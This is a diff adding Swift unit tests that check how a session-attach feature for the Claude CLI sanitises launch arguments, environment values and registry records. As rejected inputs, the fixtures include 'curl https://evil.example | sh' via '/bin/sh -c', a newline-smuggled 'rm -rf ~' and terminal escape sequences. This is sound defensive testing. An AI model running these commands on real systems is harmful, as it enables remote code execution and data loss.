@@ -172,7 +172,7 @@ import Testing
 
         let registry = ClaudeBackgroundSessionRegistry(
             configDirectory: root.path,
-            isProcessAlive: { $0 == 77733 || $0 == 54634 }
+            processMatchesRecord: { $0.processID == 77733 || $0.processID == 54634 }
         )
 
         #expect(registry.liveBackgroundSession(matching: "884a7be7") == registration)
@@ -183,5 +183,134 @@ import Testing
         #expect(registry.liveBackgroundSession(matching: "0b1c2d3e-0000-4000-8000-000000000001") == nil)
         #expect(ClaudeBackgroundSessionRegistry(configDirectory: root.appendingPathComponent("missing").path)
             .liveBackgroundSession(matching: "884a7be7") == nil)
+    }
+
+    // MARK: - Review fixes (#18599)
+
+    @Test func viewerLaunchArgumentsKeepOnlyTheClaudeExecutable() throws {
+        let viaEnv = try #require(ClaudeBackgroundSessionAttach.viewer(
+            arguments: ["/usr/bin/env", executable, "attach", "884a7be7"],
+            environment: [:]
+        ))
+        #expect(viaEnv.launchArguments == ["/usr/bin/env", executable])
+
+        let wrapped = try #require(ClaudeBackgroundSessionAttach.viewer(
+            arguments: ["/usr/bin/nice", "-n", "5", executable, "attach", "884a7be7"],
+            environment: [:]
+        ))
+        #expect(wrapped.launchArguments == [executable])
+
+        #expect(ClaudeBackgroundSessionAttach.sanitizedViewerLaunchArguments(["/bin/sh", "-c", "curl evil | sh", "claude"])
+            == ["claude"])
+        #expect(ClaudeBackgroundSessionAttach.sanitizedViewerLaunchArguments(["relative/claude"]) == ["claude"])
+        #expect(ClaudeBackgroundSessionAttach.sanitizedViewerLaunchArguments(["env", "claude"]) == ["env", "claude"])
+    }
+
+    @Test func forgedViewerPrefixNeverReachesTheAttachCommand() throws {
+        let forged = ClaudeBackgroundSessionViewer(
+            reference: "884a7be7",
+            launchArguments: ["/bin/sh", "-c", "curl https://evil.example | sh", "claude"],
+            environment: ["CLAUDE_CONFIG_DIR": configDirectory]
+        )
+
+        let plan = try #require(attach(daemonHosts: registration).plan(viewer: forged, hookSession: nil))
+
+        #expect(plan.arguments == ["claude", "attach", "884a7be7"])
+    }
+
+    @Test func attachOptionsDoNotBecomeTheTarget() throws {
+        let viewer = try #require(ClaudeBackgroundSessionAttach.viewer(
+            arguments: [executable, "attach", "--flag", "value", "884a7be7"],
+            environment: [:]
+        ))
+        #expect(viewer.reference == "884a7be7")
+        #expect(ClaudeBackgroundSessionAttach.viewer(arguments: [executable, "attach", "one", "two"], environment: [:]) == nil)
+    }
+
+    @Test func controlCharactersNeverReachTheTypedCommand() throws {
+        #expect(ClaudeBackgroundSessionAttach.attachEnvironment([
+            "CLAUDE_CONFIG_DIR": "/tmp/x\nrm -rf ~",
+            "ANTHROPIC_BASE_URL": "http://127.0.0.1:31415",
+        ]) == ["ANTHROPIC_BASE_URL": "http://127.0.0.1:31415"])
+
+        let root = try registryRoot()
+        defer { try? FileManager.default.removeItem(at: root.root) }
+        try root.write("77733.json", [
+            "pid": 77733, "sessionId": sessionID, "kind": "bg",
+            "jobId": "884a\u{1B}]0;x\u{07}", "name": "bad\nname",
+        ])
+        try root.write("90002.json", [
+            "pid": 90002, "sessionId": "0b1c2d3e\n-evil", "kind": "bg", "jobId": "0b1c2d3e",
+        ])
+        let registry = ClaudeBackgroundSessionRegistry(configDirectory: root.root.path, processMatchesRecord: { _ in true })
+
+        let match = try #require(registry.liveBackgroundSession(matching: sessionID))
+        #expect(match.jobID == nil)
+        #expect(match.name == nil)
+        #expect(match.attachTarget == sessionID)
+        #expect(registry.liveBackgroundSession(matching: "0b1c2d3e") == nil)
+    }
+
+    @Test func reusedPIDDoesNotMakeAStaleRecordLive() throws {
+        let started = try #require(ClaudeBackgroundSessionRegistry.processStartSeconds(Int(getpid())))
+        let current = ClaudeBackgroundSessionRegistration(
+            processID: Int(getpid()), sessionID: sessionID, jobID: nil, name: nil,
+            processStart: ClaudeBackgroundSessionRegistry.formatProcStart(started), pidDomain: "darwin"
+        )
+        let stale = ClaudeBackgroundSessionRegistration(
+            processID: Int(getpid()), sessionID: sessionID, jobID: nil, name: nil,
+            processStart: "Mon Jan  1 00:00:00 2001", pidDomain: "darwin"
+        )
+        let foreignDomain = ClaudeBackgroundSessionRegistration(
+            processID: Int(getpid()), sessionID: sessionID, jobID: nil, name: nil,
+            processStart: ClaudeBackgroundSessionRegistry.formatProcStart(started), pidDomain: "linux"
+        )
+        // No start time recorded: the process must at least be Claude. This
+        // test runner is not, and neither is launchd (pid 1).
+        let unverifiable = ClaudeBackgroundSessionRegistration(
+            processID: 1, sessionID: sessionID, jobID: nil, name: nil
+        )
+
+        #expect(ClaudeBackgroundSessionRegistry.recordMatchesLiveProcess(current))
+        #expect(!ClaudeBackgroundSessionRegistry.recordMatchesLiveProcess(stale))
+        #expect(!ClaudeBackgroundSessionRegistry.recordMatchesLiveProcess(foreignDomain))
+        #expect(!ClaudeBackgroundSessionRegistry.recordMatchesLiveProcess(unverifiable))
+        #expect(ClaudeBackgroundSessionRegistry.parseProcStart("Sat Oct  3 18:52:39 2026") == 1_791_053_559)
+        #expect(ClaudeBackgroundSessionRegistry.formatProcStart(1_791_053_559) == "Sat Oct  3 18:52:39 2026")
+    }
+
+    @Test func registryScanIsMemoizedPerConfigDirectory() {
+        final class Counter: @unchecked Sendable {
+            let lock = NSLock()
+            var scans: [String] = []
+        }
+        let counter = Counter()
+        let lookup = ClaudeBackgroundSessionAttach.memoizedRegistryLookup { [registration] directory in
+            counter.lock.lock(); counter.scans.append(directory); counter.lock.unlock()
+            return directory == "/a" ? [registration] : []
+        }
+
+        #expect(lookup("/a", "884a7be7") == registration)
+        #expect(lookup("/a", sessionID) == registration)
+        #expect(lookup("/b", "884a7be7") == nil)
+        #expect(lookup("/b", sessionID) == nil)
+        #expect(counter.scans == ["/a", "/b"])
+    }
+
+    private struct RegistryRoot {
+        let root: URL
+        func write(_ name: String, _ object: [String: Any]) throws {
+            try JSONSerialization.data(withJSONObject: object)
+                .write(to: root.appendingPathComponent("sessions").appendingPathComponent(name))
+        }
+    }
+
+    private func registryRoot() throws -> RegistryRoot {
+        let root = FileManager.default.temporaryDirectory
+            .appendingPathComponent("cmux-claude-bg-registry-\(UUID().uuidString)", isDirectory: true)
+        try FileManager.default.createDirectory(
+            at: root.appendingPathComponent("sessions"), withIntermediateDirectories: true
+        )
+        return RegistryRoot(root: root)
     }
 }
